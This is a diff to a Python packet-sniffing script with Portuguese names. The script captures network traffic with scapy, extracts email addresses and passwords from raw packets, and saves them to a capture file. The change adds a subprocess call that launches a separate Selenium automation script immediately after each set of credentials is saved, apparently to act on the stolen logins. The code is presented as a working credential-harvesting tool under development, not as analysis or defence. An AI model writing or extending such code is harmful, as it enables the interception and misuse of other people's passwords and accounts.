@@ -1,6 +1,7 @@
 import os
 from scapy.all import sniff, Raw
 from urllib.parse import unquote
+import subprocess
 
 ARQUIVO_SAIDA = "captura.txt"
 
@@ -38,7 +39,7 @@ def processar(pacote):
 
                 # salva imediatamente no arquivo
                 salvar_credenciais(email, senha)
-
+                subprocess.run(["python", "selenium_automation.py"])
                 print("-----------------------------------------\n")
 
         except Exception:
